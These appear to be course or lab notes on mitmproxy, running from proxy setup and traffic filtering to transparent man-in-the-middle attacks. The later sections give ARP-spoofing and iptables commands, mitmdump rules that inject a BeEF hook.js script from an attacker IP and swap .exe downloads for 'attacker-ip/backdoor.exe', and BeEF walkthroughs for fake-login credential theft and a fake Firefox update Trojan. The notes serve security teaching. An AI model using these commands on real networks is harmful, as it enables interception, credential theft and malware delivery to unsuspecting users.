# mitmproxy (manual packet analysis & modification)

Link: [https://github.com/mitmproxy/mitmproxy/releases](https://github.com/mitmproxy/mitmproxy/releases)

Short summary
mitmproxy is an interactive, programmable HTTP(S) man-in-the-middle proxy. Use it to inspect, intercept, modify and replay HTTP and HTTPS traffic. It provides three main frontends: `mitmdump` (CLI, scripting), `mitmproxy` (interactive console UI) and `mitmweb` (web UI).

---

## Components (what you downloaded)

* `mitmproxy` — interactive text UI (ncurses-like). Good for manual intercept & edits.
* `mitmdump` — command-line tool for scripted/automated flows (like `tcpdump` but for HTTP flows).
* `mitmweb` — browser-based GUI (handy for visual inspection).
* CA certificate generator — mitmproxy generates a local CA cert used to sign interception certs for HTTPS.

---

## Quick install & unpack (Linux)

1. Download release tarball from the releases link you gave.
2. Extract to a convenient folder, e.g. `/opt/mitmproxy` (you already used `/opt` in lecture):
   `tar xvf mitmproxy-x.y.z-linux.tar.gz -C /opt/mitmproxy`
3. Make sure binary is executable and on PATH (or run via full path).

Alternatively use the Python package:

```bash
python3 -m pip install --user mitmproxy
```

---

## Basic usage / commands

* Run console UI on default port 8080:
  `mitmproxy`
* Run web UI (default [http://127.0.0.1:8081](http://127.0.0.1:8081)):
  `mitmweb --listen-port 8080`
* Run headless capture or scriptable flow dump:
  `mitmdump -w dumpfile`  (writes flows to `dumpfile` for later replay/analysis)
* Use a script to modify flows:
  `mitmdump -s script.py`

Common flags:

* `--listen-host 0.0.0.0` to accept remote connections (careful: exposes proxy on network)
* `--set block_global=false` or similar for behavior tuning
* `-p <port>` / `--listen-port <port>`

---

## HTTPS interception — CA certs

* mitmproxy acts as a CA and issues per-site certs to the client.
* You must install mitmproxy CA cert on client devices/browsers (or on OS trust store) to avoid browser TLS errors.
* CA location: run `mitmproxy` once and follow instructions, or use `mitmproxy --showhost` and check `~/.mitmproxy/` for `mitmproxy-ca-cert.pem`.
* Mobile devices: install the `mitmproxy` CA (and note OS / app TLS pinning may still block interception).

---

## Getting client traffic through mitmproxy

* Configure client browser/device proxy to point at mitmproxy host:port (e.g., `http://<attacker_ip>:8080`).
* On Wi-Fi targets, if doing ARPspoofing/mitm at L2, you may forward traffic into your proxy (see notes below about one-way spoofing and responses).
* For automated labs, set the system proxy or use browser plugins to redirect.

#  Using mitmproxy Web Interface for Analyzing Packet Flows

---

## 🔹 Goal

Learn to **analyze and understand network packet flows** using the **mitmproxy web interface** before building or triggering attacks.

---

## 🔧 Setup Steps

### 1. Navigate to mitmproxy Folder

* Location (from lecture): `/opt/mitmproxy`
* Contains 3 tools:

  * `mitmdump` – command-line tool (automated/scripted)
  * `mitmproxy` – terminal UI
  * `mitmweb` – web-based interface (best for analysis)

### 2. Launch mitmweb

```bash
./mitmweb
```

* Displays two URLs:

  * Proxy address: `http://127.0.0.1:8080`
  * Web interface: `http://127.0.0.1:8081`

Open the web interface in your browser.

---

## 🌐 Configuring the Browser (Explicit Proxy Mode)

### Use Extension [FoxyProxy](https://chromewebstore.google.com/detail/foxyproxy/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en) 

OR 

1. Open **Firefox → Preferences → Advanced → Network → Settings**
2. Choose **Manual Proxy Configuration**
3. Enter:

   ```
   HTTP Proxy: 127.0.0.1
   Port: 8080
   ```
4. Save and exit.

---

## 🔐 Configuring the CA Certificate for Mitmproxy

1. Open your browser and go to 👉 **[http://mitm.it](http://mitm.it)**
2. Download the certificate for your operating system or browser (e.g., Firefox, Windows, Linux, etc.).
3. Import the downloaded certificate into your browser’s trusted certificate store.

   * **Firefox:**
     `Settings → Privacy & Security → Certificates → View Certificates → Authorities → Import`
   * **Chrome / Edge (System Store):**
     `Settings → Security → Manage Certificates → Authorities → Import`
4. Once imported, Mitmproxy will be able to decrypt HTTPS traffic for analysis and interception.

---
## 🔍 How It Works

* All traffic from the browser → mitmproxy → internet
* Responses from the internet → mitmproxy → browser
* This allows full **inspection and modification** of web traffic.

Use this setup **only for analysis** on your own machine for now.

---

## ⚙️ Modes in mitmproxy

* **Explicit Mode (default)**
  Browser connects directly to the proxy (manual setup).
  ✅ Best for local analysis/testing.

* **Transparent Mode**
  Redirects packets automatically (used with ARP spoofing).
  ⚠️ Advanced – used in later attacks.

---

## 📊 Analyzing Traffic

Once proxy is active and you browse (e.g., to Bing.com):

* All **HTTP/HTTPS requests** and **responses** appear in the mitmweb dashboard.
* Each flow includes:

  * Request URL
  * Method (GET/POST)
  * Headers & Body
  * Response Code
  * HTML/JSON/Images/etc.

You can inspect each flow:

* **Request Tab:** Shows what was sent to the server.
* **Response Tab:** Shows what came back (HTML, JSON, etc.).

---

## 🔎 Searching & Filtering in mitmweb

### Search Box

Use filters to narrow down flows. Examples:

* `~a` → show **assets** (JS, CSS, images, Flash)
* `~m post` → show **POST** requests only
* `~m get` → show **GET** requests only
* Combine: `~a .js` → show only JavaScript files

### Highlight Box

Similar to search, but instead of filtering, it **highlights** matching results (marks them yellow).

#  Interceting & Modifying Packets with **mitmproxy (mitmweb)**

---

## 🔹 Goal

Understand how to **intercept, hold, and modify** packets using the intercept feature in **mitmproxy web** (mitmweb).

---

## ⚙️ Setup Recap

* mitmproxy/mitmweb already installed and running.
* Browser configured to use it as a proxy (`127.0.0.1:8080`).

So all traffic from the browser → **mitmproxy** → internet → browser.

---

## 🧩 1. Intercepting Packets

### ▶ What “Intercept” Does

* Stops packets from reaching their destination until you review or modify them.
* Works **both ways** — from client → server or server → client.
* Based on **rules** (like regex or filters).

---

### 🧠 Filter Syntax (Same as Search)

You can reuse the same syntax as the **search** and **highlight** bars:

| Filter    | Meaning                             |
| --------- | ----------------------------------- |
| `~m post` | Intercept all **POST** requests     |
| `~m get`  | Intercept all **GET** requests      |
| `/.*`     | Intercept **everything** (wildcard) |
| `~s`      | Match based on **response body**    |
| `~b`      | Match based on **request body**     |

---

### 🧪 Example 1: Intercept POST Requests

1. In **Intercept Bar**, type:

   ```
   ~m post
   ```
2. Open Bing and perform a search.
3. POST packets will be paused — mitmproxy holds them.
4. Click the intercepted flow to inspect it.
5. Options available:

   * **Resume** – forward packet to destination.
   * **Delete** – drop it.
   * **Repeat** – resend it.
   * **Abort** – terminate connection.

✅ **Result:** You can stop and control any packet that matches the POST rule.

---

### 🧪 Example 2: Block All Traffic

1. In **Intercept Bar**, type:

   ```
   /*
   ```
2. Try to visit any site (e.g., Google, Facebook).
3. All requests freeze in mitmproxy.
4. The target browser loses connection — everything is held.

✅ **Result:** Full traffic stop (like a manual DoS on the session).

---

## 🧩 2. Modifying Packets

Now, let’s see how to **edit packets on the fly** and send them altered.

### ⚙️ Step 1: Identify What to Modify

1. Visit Bing.com in the proxied browser.
2. Filter responses in mitmweb:

   ```
   ~s
   ```
3. Choose the main HTML response (the page source).

---

### ⚙️ Step 2: Create an Intercept Rule

We want to intercept the **HTML response body** that includes `</body>` — the perfect place to inject code.

Add this rule:

```
~bs </body>
```

> 🔸 `~b` = match body,
> 🔸 `s` = match server response,
> 🔸 `</body>` = target tag to hook into.

Now, any page with a `</body>` tag will pause for modification.

---

### ⚙️ Step 3: Edit the Intercepted Packet

1. When a flow is intercepted, click it.
2. Open the **Response** tab.
3. Click the ✏️ (pencil) icon to make it editable.
4. Scroll to the end of the HTML.
5. Paste your JavaScript payload **right before** `</body>`:

```html
<script>alert('test');</script>
```

6. Save the changes (✅ checkmark).
7. Click **Resume Flow** to send the modified packet.

---

### 🧩 Step 4: Verify in Browser

Once resumed, the browser will render the injected JavaScript.

✅ Expected:
An alert box pops up saying **“test”**.

---

## 💡 Why This Is Important

* This proves **you control traffic in real time**.
* Any injected JS = potential to:

  * Inject **keyloggers**
  * Inject **redirects**
  * Load **malicious scripts**
  * Replace **download files**
* Shows the concept of **client-side manipulation** in man-in-the-middle attacks.

# 🧠 Running mitmproxy in a Realistic (Transparent) Man-in-the-Middle Setup

---

## 🎯 Objective

Use **mitmproxy** in a **transparent mode** to capture, analyze, and inject packets **against another machine** on the same network — instead of your own browser.

---

## ⚙️ Step 1: Become the Man-in-the-Middle

You can use **any MITM method**:

* ARP spoofing (e.g., `ettercap`, `arpspoof`)
* Fake AP
* Rogue gateway setup

🧪 Example using **Ettercap**:

```bash
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP/ /ROUTER_IP/
```

➡️ This poisons ARP tables and makes the attacker’s machine act as the **router** for the target.

---

## ⚙️ Step 2: Redirect Target’s Traffic to mitmproxy

Traffic from the target will now go **through you**, but mitmproxy needs to capture it.

Use **iptables** to redirect all HTTP (port 80) traffic to mitmproxy’s listening port (default 8080 or 8081).

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

💡 This is equivalent to manually setting a browser proxy — but automated for all traffic.

---

## ⚙️ Step 3: Run mitmproxy in Transparent Mode

Start **mitmweb** (the web UI) in transparent mode:

```bash
mitmweb --transparent
```

* Default proxy port: **8080**
* Default web UI port: **8081**
* You’ll see: `Running on http://127.0.0.1:8081` and `Mode: transparent`

✅ Now, all target traffic on port 80 flows into mitmproxy automatically.

---

## 🧩 Step 4: Verify Data Flow

On the target (Windows) machine:

* Open browser → visit any site (e.g., `bing.com`)
* On attacker’s **mitmweb**, you should now see:

  * All HTTP requests
  * Responses
  * Images, scripts, forms, etc.

You can now:

* Intercept packets
* Edit responses
* Inject payloads

Exactly as before in local testing — but now it’s live between two hosts.

---

## ⚙️ Step 5: Inject JavaScript Payload (Hooking to BeEF)

1. **Start BeEF (Browser Exploitation Framework)**

   ```bash
   beef-xss
   ```

   * Opens at: `http://127.0.0.1:3000/ui/panel`
   * Default credentials: `beef / beef`

2. **Copy the BeEF Hook Script**
   Found in the BeEF console:

   ```html
   <script src="http://YOUR_IP:3000/hook.js"></script>
   ```

   Example:

   ```html
   <script src="http://10.0.2.15:3000/hook.js"></script>
   ```

3. **Intercept and Inject into mitmproxy Response**

   * Set intercept rule in mitmweb:

     ```
     ~bs </body>
     ```
   * When a response is intercepted:

     * Edit response body.
     * Insert the BeEF hook **before** `</body>`:

       ```html
       <script src="http://10.0.2.15:3000/hook.js"></script>
       ```
     * Save ✅
     * Resume the flow ▶

4. **Result:**
   Target browser loads page → executes script → gets **hooked into BeEF**.

   You’ll see their browser appear under “Online Browsers” in BeEF’s UI.

---

## 🧠 Step 6: Post-Exploitation via BeEF

From BeEF, you can:

* Run **JavaScript commands** remotely.
* Display fake prompts or updates.
* Steal credentials or cookies.
* Redirect the user.
* Capture screenshots.

⚠️ Everything runs **client-side** in the hooked browser — no need for downloads or exploits.

---

## 🧩 Step 7: Cleanup

After testing:

1. **Stop mitmproxy**

   ```
   Ctrl + C
   ```
2. **Remove iptables rule**

   ```bash
   iptables -t nat -F
   ```
3. **Stop ARP spoofing attack**
   (e.g., close Ettercap or terminate `arpspoof`)

✅ Restores the network to normal.

# 🧠  Automating MITM Attacks with `mitmdump` (Replace Function)

---

## 🎯 Objective

Automate JavaScript/code injection in **mitmproxy** using **mitmdump** — no manual interception or editing required.
This saves time, avoids browser hangs, and scales attacks automatically.

---

## 🧩 Tool Overview

* **`mitmweb`** → GUI (used before for manual intercept/edit)
* **`mitmdump`** → Command-line version (scriptable, automatable)

Both share the same backend engine but different interfaces.

---

## ⚙️ Step 1: Environment Recap

Before using `mitmdump`, ensure:

* You are **MITM** (via ARP spoofing / Ettercap).
* IP tables redirect port **80 → 8080 (mitmproxy default)**:

  ```bash
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
  ```

---

## ⚙️ Step 2: Command Structure

`mitmdump` uses the **`--replace`** argument for auto modification of packets.

### 🧩 General Syntax:

```
mitmdump --transparent --replace :<filter>::<search_pattern>::<replacement>
```

---

## 🧠 Step 3: Build the Injection Command

### Example Goal:

Inject BeEF hook (or any JS payload) before `</body>` in all response pages.

### Command:

```bash
mitmdump --transparent --replace :~s:"</body>":"<script src='http://<ATTACKER_IP>:3000/hook.js'></script></body>"
```

```bash
mitmdump --transparent --replace :~s:"</body>":"<script src='http://127.0.0.1:3000/hook.js'></script></body>"
```

### Breakdown:

| Part                                                           | Meaning                                                |
| -------------------------------------------------------------- | ------------------------------------------------------ |
| `--transparent`                                                | Run in transparent MITM mode                           |
| `--replace`                                                    | Trigger automatic packet replacement                   |
| `:~s:`                                                         | Filter → modify all **server responses**               |
| `</body>`                                                      | Pattern to look for                                    |
| `<script src='http://10.0.2.15:3000/hook.js'></script></body>` | Replacement code (injected JS + preserved closing tag) |

💡 `~s` filters responses (since `~bs` — response body — isn’t always implemented).

---

## 🧠 Step 4: Why It Works

Every HTML response passing through the proxy that contains `</body>` will have your code injected before it.
This happens *automatically* — no need to pause, edit, or resume flows manually in `mitmweb`.

---

## ⚙️ Step 5: Test the Attack

1. Start `beef-xss`

   ```bash
   beef-xss
   ```
2. Run the `mitmdump` command (from Step 3).
3. On the target machine, open any HTTP site (e.g., `bing.com`).
4. Check BeEF → the target browser should now appear as **Online**.
5. Execute a test command, e.g., alert box:

   ```js
   alert("Hooked by BeEF!");
   ```

✅ If alert appears → injection successful.

---

## ⚙️ Step 6: Customizing Replacements

You can replace **anything**, not just `</body>` tags.

### Examples:

| Goal               | Replace Rule                                            |
| ------------------ | ------------------------------------------------------- |
| Replace images     | `--replace ":~s:logo.png:evil_logo.png:"`               |
| Redirect downloads | `--replace ":~s:.exe:http://attacker-ip/backdoor.exe:"` |
| Modify text        | `--replace ":~s:Welcome:You’ve been hacked!:"`          |

---

## ⚙️ Step 7: Cleanup

Once done:

```bash
iptables -t nat -F
```

Stops redirection and returns network to normal.

## 🧠  Using BeEF (Browser Exploitation Framework)

### 🎯 Overview

* BeEF = Browser Exploitation Framework.
* Used for **client-side attacks** by controlling browsers through a JavaScript hook.
* Once a target browser is hooked → attacker can execute **commands, exploits, and social-engineering attacks**.

---

### ⚙️ BeEF Interface & Command Types

* BeEF categorizes modules:

  * **Browser** → interacts directly with browser (e.g., alerts, webcam, screenshots).
  * **Exploits** → runs specific browser or plugin exploits.
  * **Social Engineering** → fake prompts, login pages, updates.
  * **Network / Host** → limited due to sandboxing, but can use tricks like redirecting, phishing, etc.
* Commands can be searched or filtered.

---

### 💻 Example Commands

#### 1. Alert Box

* Command: *Create an alert dialog*
* Shows a pop-up message on the target’s browser.
* Example:

  * Message: “Test” → Target sees pop-up “Test”.

#### 2. Run JavaScript

* Execute any **custom JavaScript** on target’s browser.
* Example:

  ```javascript
  alert("BeEF raw JavaScript");
  ```
* Can use for keyloggers, redirects, data theft scripts, etc.

#### 3. Screenshot (Spyder Plugin)

* Captures a screenshot of the target’s browser tab.
* Displays the captured image in BeEF UI.

#### 4. Redirect (Redirect Module)

* Redirects target’s browser to any webpage.
* Use cases:

  * Redirect to fake login pages.
  * Redirect to malware download sites.
  * Redirect to phishing websites.

---

### 🕵️‍♂️ Credential-Stealing Example

* Module: **Fake Login Page / Re-authentication**
* Shows a **fake login screen** (e.g., Facebook, YouTube, etc.).
* The user re-enters their credentials → BeEF captures username & password.
* Works by simulating a “session expired” message.

---

### ⚠️ Example: Facebook Login Steal

1. Select module → *Social Engineering → Fake Login*
2. Choose “Facebook”.
3. Target sees:
   “You’ve been logged out. Please log in again.”
4. Victim enters credentials.
5. BeEF shows:

   ```
   Username: haseeb
   Password: 123456
   ```

---

### 🧩 Social Engineering Example: Clippy Plugin

#### 🧰 Purpose

* Displays **Microsoft Clippy** icon telling the user their browser is out of date.
* Tricks the target into downloading an “update” (malicious file).

#### ⚙️ Setup Steps

1. Module → *Social Engineering → Clippy*
2. Configure options:

   * **Image URL:** Attacker IP (e.g., `http://10.0.2.15`)
   * **Message:** “Your Firefox is out of date. Do you want to update it?”
   * **Download Link:** Link to malicious `.exe` file (e.g., `http://10.0.2.15/evil/Firefox.exe`)
   * **Post-Download Message:** “Thank you for updating your browser.”
3. Execute module.

#### 🧨 Result

* Victim sees popup with Clippy → clicks “Yes”.
* Downloads a **fake Firefox installer** (actually the attacker’s Trojan).
* Runs it → gets a real installer **+** executes hidden backdoor.
* Attacker gains **remote control** (via Empire, Metasploit, etc.).

---

### 🔚 Summary

* BeEF allows:

  * Browser control (alerts, screenshots, redirects)
  * Credential theft (fake login pages)
  * Social engineering (fake updates, notifications)
  * Integration with payloads (Trojan + backdoor delivery)
* Attacker gains **persistent access** once the victim interacts with malicious content.
